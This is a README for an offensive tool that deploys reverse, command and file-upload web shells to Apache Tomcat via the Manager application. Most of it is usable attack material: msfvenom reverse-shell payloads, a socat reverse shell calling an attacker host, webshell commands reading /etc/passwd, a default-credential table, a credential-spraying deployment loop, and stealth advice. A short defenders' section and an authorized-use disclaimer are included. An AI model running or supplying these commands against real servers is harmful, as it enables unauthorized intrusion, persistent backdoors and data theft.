# Tomcat WAR Shell Deployment Tool

Modern, feature-rich tool for deploying web shells to Apache Tomcat servers via the Manager application.

## Features

- 🚀 **Multiple Shell Types**: Reverse, command, and file upload shells
- 🔐 **SSL/HTTPS Support**: Secure connections to Tomcat
- 🎯 **Auto-Listener**: Automatic netcat listener for reverse shells
- 🧹 **Auto-Cleanup**: Removes deployed shells after use
- ✅ **Smart Validation**: Pre-flight checks for connectivity and authentication
- 📝 **Verbose Mode**: Detailed debugging information
- 🎲 **Random Names**: Generates random WAR names for stealth

## Requirements

### Core Dependencies
- `bash` 4.0+
- `curl`

### Shell-Specific Dependencies
- **Reverse Shell**: `msfvenom` (Metasploit Framework), `nc` (netcat)
- **Command Shell**: `jar` (JDK)
- **Upload Shell**: `jar` (JDK)

### Installation

```bash
# Debian/Ubuntu
sudo apt install curl metasploit-framework netcat-openbsd default-jdk

# RedHat/CentOS/Fedora
sudo yum install curl metasploit-framework nmap-ncat java-devel

# Arch Linux
sudo pacman -S curl metasploit netcat jdk-openjdk

# macOS
brew install curl metasploit netcat openjdk
```

## Usage

### Basic Syntax

```bash
./tomcat-deploy.sh [OPTIONS] -l LHOST -p LPORT -t RHOST -r RPORT -u USER -P PASS
```

### Required Options

| Option | Description |
|--------|-------------|
| `-t, --target RHOST` | Target Tomcat server IP/hostname |
| `-u, --user USER` | Tomcat manager username |
| `-P, --pass PASS` | Tomcat manager password |

### Optional Settings

| Option | Description | Default |
|--------|-------------|---------|
| `-l, --lhost LHOST` | Local host for reverse shell | - |
| `-p, --lport LPORT` | Local port for listener | - |
| `-r, --rport RPORT` | Target Tomcat port | 8080 |
| `-n, --name NAME` | WAR filename | Random |
| `-T, --type TYPE` | Shell type (reverse\|cmd\|upload) | reverse |
| `-s, --ssl` | Use HTTPS | false |
| `-L, --listener` | Auto-start netcat listener | false |
| `-k, --keep` | Keep WAR after deployment | false |
| `-v, --verbose` | Enable verbose output | false |
| `-h, --help` | Show help message | - |

## Shell Types

### 1. Reverse Shell (default)

Standard TCP reverse shell using Metasploit payload.

```bash
# Basic reverse shell
./tomcat-deploy.sh -l 10.10.14.5 -p 4444 \
  -t 10.10.10.95 -r 8080 \
  -u tomcat -P s3cret

# With auto-listener
./tomcat-deploy.sh -l 10.10.14.5 -p 4444 \
  -t 10.10.10.95 -r 8080 \
  -u tomcat -P s3cret -L
```

**Features:**
- Uses `java/jsp_shell_reverse_tcp` payload
- Auto-cleanup after shell exits
- Optional automatic listener

### 2. Command Shell

Web-based command execution interface.

```bash
./tomcat-deploy.sh -T cmd \
  -t 10.10.10.95 -r 8080 \
  -u tomcat -P s3cret
```

**Access:**
```bash
# Web interface
http://10.10.10.95:8080/shell_abc123/cmd.jsp

# Direct command execution
curl "http://10.10.10.95:8080/shell_abc123/cmd.jsp?cmd=whoami"
```

**Features:**
- Web-based GUI
- GET parameter command execution
- Persistent (remains until manually removed)

### 3. Upload Shell

File upload and download interface.

```bash
./tomcat-deploy.sh -T upload \
  -t 10.10.10.95 -r 8080 \
  -u tomcat -P s3cret
```

**Access:**
```bash
# Upload via web interface
http://10.10.10.95:8080/shell_abc123/upload.jsp

# Upload via curl
curl -u tomcat:s3cret \
  -F "file=@/path/to/local/file.txt" \
  http://10.10.10.95:8080/shell_abc123/upload.jsp

# Download file
curl "http://10.10.10.95:8080/shell_abc123/upload.jsp?file=/etc/passwd" -o passwd
```

**Features:**
- Web GUI for file uploads
- Direct file download via URL parameter
- Multipart form support

## Examples

### Example 1: Quick Reverse Shell

```bash
./tomcat-deploy.sh \
  -l 192.168.1.100 -p 4444 \
  -t 192.168.1.50 -r 8080 \
  -u admin -P admin \
  -L
```

**Output:**
```
╔═══════════════════════════════════════════════════════╗
║       Tomcat WAR Shell Deployment Tool v2.0          ║
║       Enhanced Multi-Payload Deployment Suite        ║
╚═══════════════════════════════════════════════════════╝

[+] Configuration:
   Target:    192.168.1.50:8080
   User:      admin
   Shell:     reverse
   Name:      shell_a7b3c9d2
   Callback:  192.168.1.100:4444

[*] Testing connectivity to 192.168.1.50:8080...
[+] Target is reachable
[*] Testing Tomcat Manager authentication...
[+] Authentication successful
[*] Generating reverse shell payload...
[+] Payload generated: /tmp/tmp.xyz/shell_a7b3c9d2.war
[*] Deploying WAR to target...
[+] Deployment successful
[*] Triggering reverse shell...
[+] Starting listener on port 4444...
```

### Example 2: HTTPS with Custom Name

```bash
./tomcat-deploy.sh \
  -l 10.10.14.5 -p 443 \
  -t secure.example.com -r 8443 \
  -u manager -P 'P@ssw0rd!' \
  -n backdoor \
  -s -L
```

### Example 3: Persistent Command Shell

```bash
./tomcat-deploy.sh \
  -T cmd \
  -t 10.10.10.95 -r 8080 \
  -u tomcat -P tomcat \
  -n webshell \
  -k
```

Access at: `http://10.10.10.95:8080/webshell/cmd.jsp`

### Example 4: Using Environment Variables

```bash
export TOMCAT_USER=admin
export TOMCAT_PASS=s3cret

./tomcat-deploy.sh \
  -l 10.10.14.5 -p 4444 \
  -t 10.10.10.95
```

### Example 5: Verbose Debugging

```bash
./tomcat-deploy.sh \
  -l 10.10.14.5 -p 4444 \
  -t 10.10.10.95 -r 8080 \
  -u tomcat -P tomcat \
  -v
```

## Post-Exploitation

### Manual Cleanup

If auto-cleanup fails or shell is kept with `-k`:

```bash
# Via curl
curl -u tomcat:s3cret \
  "http://10.10.10.95:8080/manager/text/undeploy?path=/shell_name"

# Via Tomcat Manager GUI
# Navigate to http://10.10.10.95:8080/manager/html
# Find application and click "Undeploy"
```

### Upgrade Reverse Shell

Once you have a basic shell:

```bash
# Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice

# Or use socat
# On attacker:
socat file:`tty`,raw,echo=0 tcp-listen:5555
# In shell:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:5555
```

## Common Tomcat Default Credentials

| Username | Password | Notes |
|----------|----------|-------|
| `tomcat` | `tomcat` | Most common |
| `admin` | `admin` | Common default |
| `tomcat` | `s3cret` | Common default |
| `admin` | `password` | Weak password |
| `manager` | `manager` | Role-based |
| `role1` | `role1` | Default role |
| `both` | `tomcat` | Both role access |
| `root` | `root` | Sometimes used |

## Security Considerations

### For Penetration Testers

✅ **Do:**
- Always get proper authorization
- Document all actions
- Clean up shells after testing
- Use random names for stealth
- Test in isolated environments first

❌ **Don't:**
- Leave shells on production systems
- Use default/obvious names
- Deploy without cleanup plan
- Test without authorization
- Expose shells to internet

### For Defenders

**Detection:**
- Monitor Tomcat manager access logs
- Alert on unusual WAR deployments
- Check for unexpected applications
- Monitor outbound connections
- Review application list regularly

**Prevention:**
- Use strong manager credentials
- Restrict manager access by IP
- Disable manager if not needed
- Keep Tomcat updated
- Use Web Application Firewall (WAF)

**Mitigation:**
```bash
# Restrict manager access (tomcat-users.xml)
<role rolename="manager-gui"/>
<user username="admin" password="strong_password" roles="manager-gui"/>

# IP restriction (manager/META-INF/context.xml)
<Valve className="org.apache.catalina.valves.RemoteAddrValve"
       allow="192\.168\.1\..*" />
```

## Troubleshooting

### Connection Issues

**Problem:** Cannot connect to target
```bash
[*] Testing connectivity to 10.10.10.95:8080...
[-] Cannot connect to 10.10.10.95:8080
```

**Solutions:**
- Verify target IP and port
- Check firewall rules
- Ensure Tomcat is running
- Try with `-s` if using HTTPS

### Authentication Failures

**Problem:** Invalid credentials
```bash
[*] Testing Tomcat Manager authentication...
[-] Authentication failed (Invalid credentials)
```

**Solutions:**
- Verify username/password
- Try common defaults
- Check `tomcat-users.xml` on target
- Ensure user has `manager-script` role

### Deployment Failures

**Problem:** WAR deployment fails
```bash
[*] Deploying WAR to target...
[-] Deployment failed: FAIL - Application already exists
```

**Solutions:**
```bash
# Undeploy existing app
curl -u user:pass \
  "http://target:8080/manager/text/undeploy?path=/shell_name"

# Use different name
./tomcat-deploy.sh ... -n different_name
```

### Listener Issues

**Problem:** Reverse shell doesn't connect

**Solutions:**
- Verify LHOST is reachable from target
- Check firewall allows inbound on LPORT
- Ensure listener started before trigger
- Try manual trigger:
  ```bash
  curl http://target:8080/shell_name/
  ```

## Advanced Usage

### Chaining with Other Tools

```bash
# Use with Metasploit handler
msfconsole -q -x "use exploit/multi/handler; \
  set payload java/jsp_shell_reverse_tcp; \
  set LHOST 10.10.14.5; \
  set LPORT 4444; \
  exploit"

# Deploy without auto-listener, use pwncat
./tomcat-deploy.sh -l 10.10.14.5 -p 4444 -t target -u admin -P admin
pwncat-cs -lp 4444
```

### Custom Payloads

Modify the script to use custom WAR files:

```bash
# Create custom payload
msfvenom -p java/jsp_shell_bind_tcp \
  LPORT=4444 -f war -o custom.war

# Deploy manually
curl -u tomcat:tomcat \
  --upload-file custom.war \
  "http://target:8080/manager/text/deploy?path=/custom"
```

### Scripted Attacks

```bash
#!/bin/bash
# Test multiple credentials

targets="targets.txt"  # IP:PORT
creds="creds.txt"      # USER:PASS

while IFS=: read -r ip port; do
  while IFS=: read -r user pass; do
    echo "[*] Testing $ip:$port with $user:$pass"
    ./tomcat-deploy.sh -T cmd -t "$ip" -r "$port" \
      -u "$user" -P "$pass" -n "test_$RANDOM" 2>/dev/null && \
      echo "[+] SUCCESS: $ip:$port $user:$pass" && break
  done < "$creds"
done < "$targets"
```

## References

- [Apache Tomcat Manager Documentation](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html)
- [Tomcat WebShell Application](https://github.com/p0dalirius/Tomcat-webshell-application)
- [TomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer)
- [Java Reverse TCP Shell](https://github.com/ivan-sincek/java-reverse-tcp)
- [Java Web Shell](https://github.com/gquere/javaWebShell)
- [Original WARsend](https://github.com/thewhiteh4t/warsend)
- [Laudanum Shells](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)

## License

This tool is provided for educational and authorized penetration testing purposes only. Use responsibly and ethically.

## Contributing

Contributions welcome! Please:
- Follow existing code style
- Test thoroughly
- Update documentation
- Add examples for new features

---
##
##
